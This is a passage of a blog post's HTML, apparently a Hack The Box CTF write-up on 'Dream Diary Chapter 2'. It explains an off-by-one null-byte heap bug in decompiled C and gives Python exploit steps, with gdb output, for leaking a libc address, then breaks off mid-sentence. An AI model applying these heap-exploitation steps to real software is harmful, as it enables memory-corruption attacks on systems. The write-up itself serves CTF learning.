      <span class="n">string_terminator</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">,</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
    <span class="n">__stack_chk_fail</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">string_terminator</span><span class="p">(</span><span class="kt">long</span> <span class="n">param_1</span><span class="p">,</span><span class="kt">long</span> <span class="n">param_2</span><span class="p">)</span>

<span class="p">{</span>
  <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_2</span> <span class="o">+</span> <span class="n">param_1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Now we seem to have a problem. The <code class="language-plaintext highlighter-rouge">string_terminator</code> function puts a nullbyte at <code class="language-plaintext highlighter-rouge">notes[i]-&gt;data + notes[i]-&gt;size</code>. But that’s one byte too much. Let’s say we do this:</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">allocate</span><span class="p">(</span><span class="mh">0x108</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x108</span><span class="p">)</span>
<span class="n">allocate</span><span class="p">(</span><span class="mh">0x108</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x108</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mh">0x108</span><span class="p">)</span>
</code></pre></div></div>

<p>Right before string_terminator is called, the heap looks like this:</p>

<p>So <code class="language-plaintext highlighter-rouge">data + size = 0xe7f030+0x108</code>. Let’s do that in gdb:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="mh">0xe7f030</span><span class="o">+</span><span class="mh">0x108</span>
<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="mh">0xe7f138</span>
<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="n">xb</span> <span class="mh">0xe7f138</span>
<span class="mh">0xe7f138</span><span class="o">:</span>       <span class="mh">0x21</span>
</code></pre></div></div>
<p>So, by writing a null byte at <code class="language-plaintext highlighter-rouge">0xe7f138</code>, we overwrite the next chunks size LSB with a null byte. So this is a off-by-one nullbyte challenge.</p>

<h1 id="libc-leak">LIBC LEAK</h1>

<p>The first thing we need, is a libc leak. To get a libc pointer, we need to place a chunk into the unsorted bin. We allocate 2 chunks, when of them being unsorted bin sized and then we free them:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">allocate</span><span class="p">(</span><span class="mh">0x108</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x108</span><span class="p">)</span>
<span class="n">allocate</span><span class="p">(</span><span class="mh">0x108</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x108</span><span class="p">)</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>The program will do this:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">-</span>    <span class="err">#</span><span class="mi">1</span>
<span class="n">malloc</span><span class="p">(</span><span class="mh">0x108</span><span class="p">)</span> <span class="o">-</span> <span class="n">A</span> <span class="err">#</span><span class="mi">2</span>
<span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">-</span>    <span class="err">#</span><span class="mi">3</span>
<span class="n">malloc</span><span class="p">(</span><span class="mh">0x108</span><span class="p">)</span> <span class="o">-</span> <span class="n">B</span> <span class="err">#</span><span class="mi">4</span>
<span class="n">free</span><span class="p">(</span><span class="err">#</span><span class="mi">4</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">it</span> <span class="n">consolidates</span> <span class="n">with</span> <span class="n">the</span> <span class="n">top</span> <span class="n">chunk</span>
<span class="n">free</span><span class="p">(</span><span class="err">#</span><span class="mi">3</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">goes</span> <span class="n">to</span> <span class="n">fastbin</span>
<span class="n">free</span><span class="p">(</span><span class="err">#</span><span class="mi">2</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">unsorted</span> <span class="n">bin</span> <span class="p">(</span><span class="n">it</span> <span class="n">won</span><span class="err">'</span><span class="n">t</span> <span class="n">consolidate</span> <span class="n">because</span> <span class="n">of</span> <span class="err">#</span><span class="mi">3</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="err">#</span><span class="mi">1</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">goes</span> <span class="n">to</span> <span class="n">fastbin</span>
</code></pre></div></div>
<p>and the bins will look like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fastbins
0x20: 0xb90000 —▸ 0xb90130 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0xb90020 —▸ 0x7fe53fc97b78 (main_arena+88) ◂— 0xb90020 /* ' ' */
smallbins
empty
largebins
empty
</code></pre></div></div>

<p>Now the notes[] array is empty, so we can’t dump the first note and get the pointers. So we allocate a chunk to read the pointer, and we get the leak.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">allocate</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="sa">b</span><span class="s">"C"</span><span class="o">*</span><span class="mi">7</span><span class="p">)</span>
<span class="n">_</span><span class="p">,</span> <span class="n">libc_leak</span> <span class="o">=</span> <span class="n">dump</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>
<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x3c4c78</span>

<span class="n">info</span><span class="p">(</span><span class="s">"libc_leak @ "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">))</span>
<span class="n">info</span><span class="p">(</span><span class="s">"libc_base @ "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</code></pre></div></div>

<p><img src="" alt="diary2_heap2" /></p>

<p>We want the use the off by one, but the 0x10 chunk allocated before each desired chunk stands in our way, so we need to find a way to bypass this. We allocate 3 0x10 sized chunks, and we free them. This way, we put 6(3 data chunks + 3 notes(pointer to data and size)) chunks in the 0x20 fastbin, so for the next 6 mallocs, the 0x10 chunks will be from the fastbin.</p>

<p>Afte</p>

</div>


<div class="comments">
<div id="disqus_thread"></div>
<script>
 var disqus_config = function () {
     this.page.url = 'https://blog.edmund.digital/2021/03/07/Dream_Diary_Chapter_2-HTB.html';
     this.page.identifier = '/2021/03/07/Dream_Diary_Chapter_2-HTB';
     this.page.title = 'Dream Diary Chapter 2 - HTB';
 };

 (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
     var d = document, s = d.createElement('script');

     s.src = '//<your-discuss-shortname>.disqus.com/embed.js';

     s.setAttribute('data-timestamp', +new Date());
     (d.head || d.body).appendChild(s);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2021/02/26/Delivery-HTB.html">
            Delivery: HTB
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2021/02/25/pwnable.tw-silver_bullet.html">
            Pwnable.tw Silver Bullet
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2021/02/24/Academy-HTB.html">
            Academy: HTB
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/academy/" class="set-1">academy</a> <a href="/tag/compost/" class="set-1">compost</a> <a href="/tag/hashcat/" class="set-1">hashcat</a> <a href="/tag/heap/" class="set-1">heap</a> <a href="/tag/laravel/" class="set-1">laravel</a> <a href="/tag/nullbyte/" class="set-1">nullbyte</a> <a href="/tag/pwn/" class="set-1">pwn</a> <a href="/tag/pwnable.tw/" class="set-1">pwnable.tw</a> <a href="/tag/writeup/" class="set-5">writeup</a></div>
  




<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">

    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}

const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
    document.getElementById("theme-toggle").className = 'light';
    window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
    document.getElementById("theme-toggle").className = 'dark';
    window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else if  (userPrefers === "dark") {
    activateDarkTheme();
}

function modeSwitcher() {
    let currentMode = document.documentElement.getAttribute('data-theme');
    if (currentMode === "dark") {
        activateLightTheme();
    } else {
        activateDarkTheme();
    }
}
</script></div>
    <center>
      <script src="https://www.hackthebox.eu/badge/84630"></script>
    </center>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
